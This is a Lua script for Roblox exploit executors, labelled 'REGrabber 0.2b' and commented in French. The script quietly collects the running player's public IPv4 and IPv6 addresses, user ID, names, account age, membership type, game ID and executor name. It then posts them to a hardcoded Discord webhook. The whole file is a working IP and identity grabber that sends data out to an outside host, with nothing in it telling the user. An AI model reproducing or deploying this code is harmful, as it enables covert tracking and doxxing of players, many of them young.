local Webhook = "https://discord.com/api/webhooks/1294357215477760061/hy-m4j87g0R_-x2VWWQtj9jovJb_uLRcDWxJuB9VPcY7z0MxMSzYNP3059YTi5150N6w"

local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (service d'API)
local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (service d'API)

-- R√©cup√©ration des informations sur le joueur
local LocalPlayer = game:GetService("Players").LocalPlayer
local UserId = LocalPlayer.UserId -- ID utilisateur
local PlayerName = LocalPlayer.Name -- Nom du joueur
local DisplayName = LocalPlayer.DisplayName -- Nom affich√©
local AccountAge = LocalPlayer.AccountAge -- Dur√©e du compte en jours
local MembershipType = tostring(LocalPlayer.MembershipType) -- Type d'adh√©sion
local PlaceID = game.PlaceId -- ID du jeu en cours
local ProfilePictureUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..UserId.."&width=420&height=420&format=png" -- URL de l'image de profil

-- Obtenir la date et l'heure de connexion
local LogTime = os.date('!%Y-%m-%d %H:%M:%S GMT+0')

-- Fonction pour identifier l'exploit utilis√©
function identifyexploit()
    local success, result = pcall(identifyexecutor)
    if success then return result end
    return "Unknown Exploit"
end

-- Pr√©paration des donn√©es pour le webhook
local PlayerData = {
    ["content"] = "",
    ["embeds"] = {{
        ["author"] = { ["name"] = "üìä Informations du Joueur" },
        ["title"] = "üßë‚Äçüé§ D√©tails du Joueur",
        ["description"] = "Voici les informations sur le joueur üéÆ",
        ["color"] = 0x00FF00, -- Couleur de l'embed (vert)
        ["fields"] = {
            { ["name"] = "üë§ ID du Joueur:", ["value"] = UserId, ["inline"] = true },
            { ["name"] = "‚ú® Nom d'Affichage:", ["value"] = DisplayName, ["inline"] = true },
            { ["name"] = "üíª Nom d'Utilisateur:", ["value"] = PlayerName, ["inline"] = true },
            { ["name"] = "üîñ Type d'Adh√©sion:", ["value"] = MembershipType, ["inline"] = true },
            { ["name"] = "üìÖ Dur√©e du Compte (jours):", ["value"] = AccountAge, ["inline"] = true },
            { ["name"] = "üåê IPv4:", ["value"] = IPv4, ["inline"] = true },
            { ["name"] = "üåç IPv6:", ["value"] = IPv6, ["inline"] = true },
            { ["name"] = "üéÆ ID du Jeu:", ["value"] = PlaceID, ["inline"] = true },
            { ["name"] = "üïí Moment de la Requ√™te:", ["value"] = LogTime, ["inline"] = false },
            { ["name"] = "‚öôÔ∏è Executor:", ["value"] = identifyexploit(), ["inline"] = true },
        },
        ["thumbnail"] = { ["url"] = ProfilePictureUrl }, -- Photo de profil du joueur
        ["footer"] = { ["text"] = "üõ†Ô∏è REGrabber 0.2b", ["icon_url"] = "https://example.com/icon.png" } -- Remplacez par une URL d'ic√¥ne si n√©cessaire
    }}
}

-- Encodage des donn√©es en JSON
local HttpService = game:GetService('HttpService')
local PlayerDataJson = HttpService:JSONEncode(PlayerData)

-- Fonction pour envoyer les donn√©es au webhook
local function sendData()
    local HttpRequest
    if syn and syn.request then
        HttpRequest = syn.request
    elseif http_request then
        HttpRequest = http_request
    else
        warn("Aucun environnement compatible pour envoyer des requ√™tes HTTP.")
        return
    end

    HttpRequest({
        Url = Webhook,
        Body = PlayerDataJson,
        Method = "POST",
        Headers = {["content-type"] = "application/json"}
    })
end

-- Appeler la fonction pour envoyer les donn√©es
sendData()
